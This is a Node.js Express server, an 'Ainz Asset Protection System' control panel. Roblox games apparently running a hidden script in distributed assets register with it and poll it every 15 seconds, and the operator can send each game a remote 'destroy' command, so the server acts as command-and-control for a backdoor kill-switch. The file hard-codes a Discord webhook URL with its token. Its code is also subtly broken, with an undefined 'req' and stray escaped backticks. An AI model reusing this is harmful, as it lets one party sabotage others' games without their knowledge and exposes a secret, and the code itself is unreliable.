const express = require('express');
const cors = require('cors');
const app = express();

// Middleware
app.use(cors());
app.use(express.json());

// ⚠️ ADD YOUR DISCORD WEBHOOK HERE ⚠️
const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1402491984848879627/PACItDfwHBr8grhkiW4DXPLYFQeh1J6z_1pre8TvbpTEuXEYc-vxJLdlGREliYI_2IKw";

// Store games
let unauthorizedGames = {};

// Function to send Discord alert
async function sendDiscordAlert(gameId, gameInfo) {
  try {
    const embed = {
      title: "🚨 UNAUTHORIZED GAME DETECTED!",
      description: `**${gameInfo.name}** is using stolen assets!`,
      color: 0xff0000,
      fields: [
        {
          name: "Game ID",
          value: `\`${gameId}\``,
          inline: true
        },
        {
          name: "Place ID",
          value: `\`${gameInfo.place_id}\``,
          inline: true
        },
        {
          name: "Creator",
          value: `\`${gameInfo.creator || 'Unknown'}\``,
          inline: true
        },
        {
          name: "⚡ Quick Action",
          value: `[💥 DESTROY THIS GAME NOW](${req.headers.host ? 'https://' + req.headers.host : 'https://ainz-destruction-server.onrender.com'})`,
          inline: false
        }
      ],
      timestamp: new Date().toISOString(),
      footer: {
        text: "Ainz Asset Protection System"
      }
    };

    await fetch(DISCORD_WEBHOOK, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        content: "@here ⚠️ **NEW UNAUTHORIZED GAME DETECTED!**",
        embeds: [embed]
      })
    });
    
    console.log(`📢 Discord alert sent for game: ${gameId}`);
  } catch (error) {
    console.error('Discord alert failed:', error.message);
  }
}

// ==================== WEBSITE ====================
app.get('/', (req, res) => {
  const totalGames = Object.keys(unauthorizedGames).length;
  const destroyedGames = Object.values(unauthorizedGames).filter(g => g.destroy).length;
  const activeGames = totalGames - destroyedGames;
  
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>💥 AINZ DESTRUCTION CONTROL</title>
      <style>
        body {
          font-family: Arial, sans-serif;
          padding: 20px;
          background: #111;
          color: white;
          max-width: 1200px;
          margin: 0 auto;
        }
        .header {
          background: linear-gradient(45deg, #ff0000, #ff6b6b);
          padding: 30px;
          border-radius: 15px;
          text-align: center;
          margin-bottom: 30px;
        }
        .stats {
          display: flex;
          justify-content: center;
          gap: 30px;
          margin: 20px 0;
        }
        .stat-card {
          background: rgba(255,255,255,0.1);
          padding: 20px;
          border-radius: 10px;
          text-align: center;
          min-width: 120px;
        }
        .stat-number {
          font-size: 2rem;
          font-weight: bold;
          color: #ff6b6b;
        }
        .control-panel {
          background: rgba(255,255,255,0.05);
          padding: 25px;
          border-radius: 10px;
          margin: 20px 0;
          border: 2px solid #ff0000;
        }
        input {
          padding: 12px;
          width: 300px;
          border: none;
          border-radius: 5px;
          background: #222;
          color: white;
          margin-right: 10px;
        }
        .btn-destroy {
          background: #ff0000;
          color: white;
          border: none;
          padding: 12px 25px;
          border-radius: 5px;
          cursor: pointer;
          font-weight: bold;
        }
        .btn-destroy:hover {
          background: #cc0000;
        }
        .game-card {
          background: #1a1a1a;
          padding: 15px;
          margin: 10px 0;
          border-radius: 8px;
          border-left: 4px solid #ff0000;
          display: flex;
          justify-content: space-between;
          align-items: center;
        }
        .status {
          padding: 5px 10px;
          border-radius: 20px;
          font-size: 12px;
          font-weight: bold;
        }
        .active { background: #00aa00; }
        .destroyed { background: #ff0000; }
      </style>
    </head>
    <body>
      <div class="header">
        <h1>💥 AINZ DESTRUCTION CONTROL PANEL</h1>
        <p>Server: ${req.headers.host || 'ainz-destruction-server.onrender.com'}</p>
        <div class="stats">
          <div class="stat-card">
            <div class="stat-number">${totalGames}</div>
            <div>Total Games</div>
          </div>
          <div class="stat-card">
            <div class="stat-number">${activeGames}</div>
            <div>Active Games</div>
          </div>
          <div class="stat-card">
            <div class="stat-number">${destroyedGames}</div>
            <div>Destroyed</div>
          </div>
        </div>
      </div>
      
      <div class="control-panel">
        <h3>⚡ Quick Destruction</h3>
        <p>Enter Game ID from Discord:</p>
        <input type="text" id="gameId" placeholder="Game ID (e.g., 1234567890)">
        <button class="btn-destroy" onclick="destroyGame()">💥 DESTROY GAME</button>
        <p style="color: #aaa; margin-top: 10px; font-size: 14px;">
          Game will be destroyed within 15 seconds
        </p>
      </div>
      
      <h3>🎮 Active Unauthorized Games</h3>
      <div id="gamesList">
        ${totalGames === 0 
          ? '<p style="color: #888; font-style: italic;">No unauthorized games detected yet.</p>' 
          : ''}
      </div>
      
      <script>
        // Load games
        async function loadGames() {
          try {
            const response = await fetch('/games');
            const games = await response.json();
            
            const gamesList = document.getElementById('gamesList');
            
            if (Object.keys(games).length === 0) {
              gamesList.innerHTML = '<p style="color: #888; font-style: italic;">No unauthorized games detected yet.</p>';
              return;
            }
            
            let html = '';
            for (const [gameId, game] of Object.entries(games)) {
              const status = game.destroy ? 'DESTROYED' : 'ACTIVE';
              const statusClass = game.destroy ? 'destroyed' : 'active';
              
              html += \`
                <div class="game-card">
                  <div>
                    <strong>\${game.name || 'Unknown Game'}</strong>
                    <br>
                    <small style="color: #aaa;">ID: \${gameId}</small>
                    <br>
                    <span class="status \${statusClass}">\${status}</span>
                  </div>
                  <div>
                    \${!game.destroy ? \`
                      <button class="btn-destroy" onclick="destroySingle('\${gameId}')">
                        Destroy
                      </button>
                    \` : ''}
                  </div>
                </div>
              \`;
            }
            
            gamesList.innerHTML = html;
          } catch (error) {
            console.error('Error:', error);
          }
        }
        
        // Destroy single game
        async function destroySingle(gameId) {
          if (!confirm(\`Destroy game \${gameId}?\`)) return;
          
          const response = await fetch('/destroy/' + gameId);
          const result = await response.json();
          
          if (result.status === 'destroy_scheduled') {
            alert(\`✅ Game \${gameId} will be destroyed!\\nDiscord alert sent.\`);
            
            // Send Discord notification
            await fetch('/notify-destroy/' + gameId);
            
            loadGames();
          }
        }
        
        // Destroy game from input
        async function destroyGame() {
          const gameId = document.getElementById('gameId').value.trim();
          if (!gameId) {
            alert('Please enter Game ID!');
            return;
          }
          
          if (!confirm(\`Destroy game \${gameId}?\`)) return;
          
          const response = await fetch('/destroy/' + gameId);
          const result = await response.json();
          
          if (result.status === 'destroy_scheduled') {
            alert(\`✅ Game \${gameId} scheduled for destruction!\\nDiscord alert sent.\`);
            document.getElementById('gameId').value = '';
            
            // Send Discord notification
            await fetch('/notify-destroy/' + gameId);
            
            loadGames();
          } else {
            alert('Error: ' + (result.error || 'Unknown'));
          }
        }
        
        // Auto-refresh
        setInterval(loadGames, 10000);
        loadGames();
      </script>
    </body>
    </html>
  `);
});

// ==================== API ====================

// Register game (Roblox calls this)
app.post('/register', async (req, res) => {
  try {
    const { game_id, name, place_id, creator } = req.body;
    const gameId = String(game_id);
    
    unauthorizedGames[gameId] = {
      name: name || 'Unknown Game',
      place_id: place_id || 'unknown',
      creator: creator || 'unknown',
      destroy: false,
      registered_at: new Date().toISOString(),
      discord_alert_sent: false
    };
    
    console.log(\`⚠️ Game registered: \${gameId}\`);
    
    // Send Discord alert
    if (DISCORD_WEBHOOK) {
      await sendDiscordAlert(gameId, unauthorizedGames[gameId]);
      unauthorizedGames[gameId].discord_alert_sent = true;
    }
    
    res.json({
      status: 'registered',
      message: \`Game \${gameId} registered\`,
      discord_alert_sent: unauthorizedGames[gameId].discord_alert_sent
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Check if game should be destroyed (Roblox calls every 15s)
app.get('/check/:gameId', (req, res) => {
  const gameId = req.params.gameId;
  
  if (unauthorizedGames[gameId] && unauthorizedGames[gameId].destroy) {
    console.log(\`💥 Sending DESTROY to: \${gameId}\`);
    res.json({ destroy: true });
  } else {
    res.json({ destroy: false });
  }
});

// Destroy game (You call this from website)
app.get('/destroy/:gameId', async (req, res) => {
  const gameId = req.params.gameId;
  
  if (!unauthorizedGames[gameId]) {
    unauthorizedGames[gameId] = { 
      name: 'Manual Destruction',
      destroy: true,
      destroyed_at: new Date().toISOString()
    };
  } else {
    unauthorizedGames[gameId].destroy = true;
    unauthorizedGames[gameId].destroyed_at = new Date().toISOString();
  }
  
  console.log(\`💥 Marked for destruction: \${gameId}\`);
  
  // Send Discord notification
  if (DISCORD_WEBHOOK) {
    try {
      await fetch(DISCORD_WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: "@here ✅ **GAME DESTROYED!**",
          embeds: [{
            title: "💥 GAME DESTROYED",
            description: \`Game \${gameId} has been destroyed!\`,
            color: 0x00ff00,
            fields: [
              { name: "Game ID", value: \`\${gameId}\`, inline: true },
              { name: "Time", value: new Date().toLocaleString(), inline: true }
            ]
          }]
        })
      });
    } catch (error) {
      console.error('Discord notification failed:', error);
    }
  }
  
  res.json({
    status: 'destroy_scheduled',
    message: \`Game \${gameId} will be destroyed\`
  });
});

// Notify Discord about destruction
app.get('/notify-destroy/:gameId', async (req, res) => {
  const gameId = req.params.gameId;
  
  if (DISCORD_WEBHOOK) {
    try {
      await fetch(DISCORD_WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: "✅ **DESTRUCTION COMMAND SENT**",
          embeds: [{
            title: "💥 DESTRUCTION INITIATED",
            description: \`Game \${gameId} destruction command sent!\`,
            color: 0xff9900,
            fields: [
              { name: "Game ID", value: \`\${gameId}\`, inline: true },
              { name: "Status", value: "Will be destroyed in 15 seconds", inline: true }
            ],
            timestamp: new Date().toISOString()
          }]
        })
      });
      res.json({ status: 'discord_notification_sent' });
    } catch (error) {
      res.status(500).json({ error: error.message });
    }
  } else {
    res.json({ status: 'no_webhook_configured' });
  }
});

// List all games
app.get('/games', (req, res) => {
  res.json(unauthorizedGames);
});

// Health check
app.get('/health', (req, res) => {
  res.json({ 
    status: 'ok', 
    games: Object.keys(unauthorizedGames).length,
    discord_webhook: DISCORD_WEBHOOK ? 'configured' : 'not_configured'
  });
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(\`🚀 Server running on port \${PORT}\`);
  console.log(\`💥 Ready to destroy games!\`);
  console.log(\`📢 Discord webhook: \${DISCORD_WEBHOOK ? 'Configured' : 'Not configured'}\`);
});
